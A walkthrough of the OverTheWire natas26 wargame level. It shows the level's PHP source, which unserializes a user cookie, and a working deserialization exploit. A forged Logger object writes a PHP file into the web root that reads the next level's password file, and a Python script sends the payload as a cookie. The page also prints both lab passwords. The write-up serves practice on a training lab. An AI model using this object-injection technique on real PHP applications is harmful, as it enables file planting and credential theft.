---
title: natas 26 walkthrough
description: over the wire natas 26
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-26 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 26 walkthrough
    order: 30
---
## Description
> Username: natas26
> 
> URL:      http://natas26.natas.labs.overthewire.org

### Source Code
```php
<?php
// sry, this is ugly as hell.
// cheers kaliman ;)
// - morla

class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file)
    {
        // initialise variables
        $this->initMsg = "#--session started--#\n";
        $this->exitMsg = "#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $this->initMsg);
        fclose($fd);
    }

    function log($msg)
    {
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $msg . "\n");
        fclose($fd);
    }

    function __destruct()
    {
        // write exit message
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $this->exitMsg);
        fclose($fd);
    }
}

function showImage($filename)
{
    if (file_exists($filename))
        echo "<img src=\"$filename\">";
}

function drawImage($filename)
{
    $img = imagecreatetruecolor(400, 300);
    drawFromUserdata($img);
    imagepng($img, $filename);
    imagedestroy($img);
}

function drawFromUserdata($img)
{
    if (
        array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)
    ) {

        $color = imagecolorallocate($img, 0xff, 0x12, 0x1c);
        imageline(
            $img,
            $_GET["x1"],
            $_GET["y1"],
            $_GET["x2"],
            $_GET["y2"],
            $color
        );
    }

    if (array_key_exists("drawing", $_COOKIE)) {
        $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
        if ($drawing)
            foreach ($drawing as $object)
                if (
                    array_key_exists("x1", $object) &&
                    array_key_exists("y1", $object) &&
                    array_key_exists("x2", $object) &&
                    array_key_exists("y2", $object)
                ) {

                    $color = imagecolorallocate($img, 0xff, 0x12, 0x1c);
                    imageline(
                        $img,
                        $object["x1"],
                        $object["y1"],
                        $object["x2"],
                        $object["y2"],
                        $color
                    );
                }
    }
}

function storeData()
{
    $new_object = array();

    if (
        array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)
    ) {
        $new_object["x1"] = $_GET["x1"];
        $new_object["y1"] = $_GET["y1"];
        $new_object["x2"] = $_GET["x2"];
        $new_object["y2"] = $_GET["y2"];
    }

    if (array_key_exists("drawing", $_COOKIE)) {
        $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
    } else {
        // create new array
        $drawing = array();
    }

    $drawing[] = $new_object;
    setcookie("drawing", base64_encode(serialize($drawing)));
}
?>

<?php
session_start();
if (
    array_key_exists("drawing", $_COOKIE) ||
    (array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))
) {
    $imgfile = "img/natas26_" . session_id() . ".png";
    drawImage($imgfile);
    showImage($imgfile);
    storeData();
}

?>
```

---
## Progress
### Observation
Obviously, we can inject from `$_GET` and `$_COOKIE`. All the operations using `$_GET` samely uses `$_COOKIE`. Therefore, the attack would be undergone with cookie. 
`imageline` and `unserialize` directly use the value of user provided cookie. From [php manual](https://php.net/manual/en/function.imageline.php), I could not get any vulnerabilities. However, there are lots of warnings in the unserialize page. That's it.
### Plan
By google, I found an [article about unserialize](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md). Set log file as the png file path or anything, and inject php code as exit message.

### Pwn
```php
<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file)
    {
        // initialise variables
        $this->initMsg = "#--session started--#\n";
        $this->exitMsg = "<?php echo file_get_contents(\"/etc/natas_webpass/natas27\"); ?>";
        $this->logFile = "/var/www/natas/natas26/img/sss.txt";
    }
}
$logger = new Logger("");
$arr = array();
$arr[] = $logger;
echo base64_encode(serialize($arr));
```

```python
import requests
from requests.auth import HTTPBasicAuth

username = "natas26"
password = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"
authentication = HTTPBasicAuth(username, password)

def mal_cookie():
    mal_serialized = """YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvc3NzLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoIi9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Iik7ID8+Ijt9fQ=="""
    mal_cookie = {
        "drawing" : mal_serialized,
    }
    return mal_cookie

def main():
    url = "http://natas26.natas.labs.overthewire.org/"
    response = requests.get(url, auth=authentication, cookies=mal_cookie())

main()
```
Accessing http://natas26.natas.labs.overthewire.org/img/sss.php will get PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3

---
## Hint

---
## Solving
### Noting
- Do not use python to generate the serialized data. It only offers pain and error. 
- Use absolute path will give you higher chance to pwn.
### Category
- 
### Techniques
- 
### Reference
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
- 
### Tools
- 